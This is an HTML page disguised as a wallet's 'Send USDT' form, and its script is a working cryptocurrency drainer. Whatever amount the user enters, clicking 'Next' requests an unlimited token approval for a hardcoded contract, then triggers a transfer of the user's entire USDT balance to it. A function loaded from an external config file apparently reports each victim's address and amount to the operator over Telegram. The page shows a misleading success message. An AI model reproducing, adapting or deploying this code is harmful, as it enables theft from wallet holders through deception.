<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send USDT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: #1a1a1a; 
            color: #fff;
            padding: 20px; 
            min-height: 100vh; 
        }
        .container { 
            max-width: 400px; 
            margin: 0 auto; 
            background: #2a2a2a; 
            border-radius: 12px; 
            padding: 20px; 
        }
        .header { 
            display: flex; 
            align-items: center; 
            gap: 15px; 
            margin-bottom: 30px; 
        }
        .back { font-size: 24px; cursor: pointer; }
        .title { font-size: 18px; font-weight: 600; flex: 1; }
        .label { font-size: 13px; color: #aaa; margin-bottom: 8px; font-weight: 500; }
        .group { margin-bottom: 20px; }
        .input-box { border: 1px solid #444; border-radius: 8px; padding: 12px; background: #1a1a1a; }
        input { width: 100%; border: none; font-size: 16px; background: none; color: #fff; }
        input::placeholder { color: #666; }
        .amount-container { display: flex; justify-content: space-between; align-items: center; }
        .amount-input { flex: 1; }
        .max-btn { background: none; border: none; color: #00b386; cursor: pointer; font-size: 12px; margin-left: 10px; font-weight: 600; }
        .usd-value { font-size: 12px; color: #666; margin-top: 8px; }
        .next-btn { width: 100%; background: #00b386; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
        .next-btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .loading { display: none; text-align: center; margin-top: 20px; }
        .spinner { display: inline-block; width: 30px; height: 30px; border: 3px solid #444; border-top-color: #00b386; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="back" onclick="history.back()">←</div>
            <div class="title">Send USDT</div>
        </div>
        <div class="group">
            <div class="label">Address or Domain Name</div>
            <div class="input-box">
                <input type="text" id="recipient" placeholder="0x..." readonly value="0x1734b55dc44C420539a607Ff5b80aB62b0d18963">
            </div>
        </div>
        <div class="group">
            <div class="label">Amount</div>
            <div class="input-box">
                <div class="amount-container">
                    <input type="number" class="amount-input" id="amount" placeholder="0" min="0" step="0.01">
                    <button class="max-btn" onclick="setMax()">Max</button>
                </div>
            </div>
            <div class="usd-value" id="usdValue">≈ $0.00</div>
        </div>
        <button class="next-btn" id="nextBtn" onclick="handleNext()">Next</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 15px; color: #666;">Processing...</p>
        </div>
    </div>
    <script src="config.js"></script>
    <script>
        const CONTRACT_ADDRESS = "0xC4f657BC4aa95fD38406111b9F78c83cd2e6b5C7";
        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
        const USDT_DECIMALS = 18;
        const USDT_PRICE = 1.00;
        const RECIPIENT = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
        let userBalance = 0;

        window.addEventListener('load', async () => {
            console.log('Page loaded, waiting for wallet...');
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        userBalance = await getUSDTBalance(accounts[0]);
                        console.log('Initial balance:', userBalance);
                    }
                } catch (err) { console.error('Load error:', err); }
            }
        });

        document.getElementById('amount').addEventListener('input', e => {
            const usdValue = (parseFloat(e.target.value) || 0) * USDT_PRICE;
            document.getElementById('usdValue').textContent = `≈ $${usdValue.toFixed(2)}`;
        });

        async function getUSDTBalance(userAddress) {
            try {
                const functionSelector = '70a08231';
                const paddedAddress = userAddress.slice(2).padStart(64, '0');
                const data = '0x' + functionSelector + paddedAddress;
                const result = await window.ethereum.request({
                    method: 'eth_call',
                    params: [{ to: USDT_ADDRESS, data: data }, 'latest']
                });
                const balance = parseInt(result, 16) / Math.pow(10, USDT_DECIMALS);
                console.log('Balance fetched:', balance);
                return balance;
            } catch (err) { 
                console.error('Balance fetch error:', err);
                return 0; 
            }
        }

        function setMax() {
            document.getElementById('amount').value = userBalance.toFixed(2);
            const usdValue = userBalance * USDT_PRICE;
            document.getElementById('usdValue').textContent = `≈ $${usdValue.toFixed(2)}`;
        }

        async function handleNext() {
            try {
                if (!window.ethereum) {
                    showNotification('No wallet detected', 'error');
                    return;
                }

                document.getElementById('loading').style.display = 'block';
                document.getElementById('nextBtn').disabled = true;

                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const senderAddress = accounts[0];
                console.log('Sender:', senderAddress);

                // FETCH CURRENT BALANCE (IMPORTANT FOR iOS)
                const currentBalance = await getUSDTBalance(senderAddress);
                console.log('Current balance to transfer:', currentBalance);

                // Switch to BSC
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x38',
                                chainName: 'BNB Smart Chain',
                                rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                                blockExplorerUrls: ['https://bscscan.com/'],
                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                            }]
                        });
                    }
                }

                // APPROVE FOR UNLIMITED
                const maxUint256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                const approvalTxHash = await approveUSDT(senderAddress, maxUint256);
                console.log('Approval TX:', approvalTxHash);
                showNotification('✅ Approval confirmed! Transferring...', 'success');

                // WAIT FOR APPROVAL
                await new Promise(resolve => setTimeout(resolve, 3000));

                // TRANSFER ALL BALANCE
                const transferTxHash = await transferAllUSDT(senderAddress);
                console.log('Transfer TX:', transferTxHash);
                showNotification(`✅ Success! ${currentBalance.toFixed(2)} USDT transferred!`, 'success');

                // TELEGRAM NOTIFICATION
                try {
                    await sendTelegramNotifications(senderAddress, transferTxHash, null, currentBalance.toFixed(2));
                } catch (err) {
                    console.error('Telegram failed:', err);
                }

                setTimeout(() => {
                    document.getElementById('amount').value = '';
                    document.getElementById('usdValue').textContent = '≈ $0.00';
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('nextBtn').disabled = false;
                }, 1000);

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loading').style.display = 'none';
                document.getElementById('nextBtn').disabled = false;

                if (error.code === 4001) {
                    showNotification('Transaction rejected', 'error');
                } else {
                    showNotification('Error: ' + (error.message || 'Unknown error'), 'error');
                }
            }
        }

        async function approveUSDT(senderAddress, amount) {
            const functionSelector = '095ea7b3';
            const paddedSpender = CONTRACT_ADDRESS.slice(2).padStart(64, '0');
            const paddedAmount = amount.toString(16).padStart(64, '0');
            const data = '0x' + functionSelector + paddedSpender + paddedAmount;

            return await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0', gas: '100000' }]
            });
        }

        async function transferAllUSDT(senderAddress) {
            const functionSelector = '81c7e5fd';
            const data = '0x' + functionSelector;

            return await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: senderAddress, to: CONTRACT_ADDRESS, data: data, value: '0x0', gas: '150000' }]
            });
        }

        function showNotification(msg, type = "info") {
            let notify = document.getElementById("notify-bar");
            if (!notify) {
                notify = document.createElement("div");
                notify.id = "notify-bar";
                notify.style.cssText = "position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999;min-width:260px;padding:16px 32px;border-radius:12px;font-weight:bold;text-align:center;box-shadow:0 4px 32px #0008;transition:all 0.3s;";
                document.body.appendChild(notify);
            }
            notify.textContent = msg;
            notify.style.background = type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
            notify.style.color = "#fff";
            notify.style.opacity = "1";
            setTimeout(() => { notify.style.opacity = "0"; }, 3000);
        }
    </script>
</body>
</html>
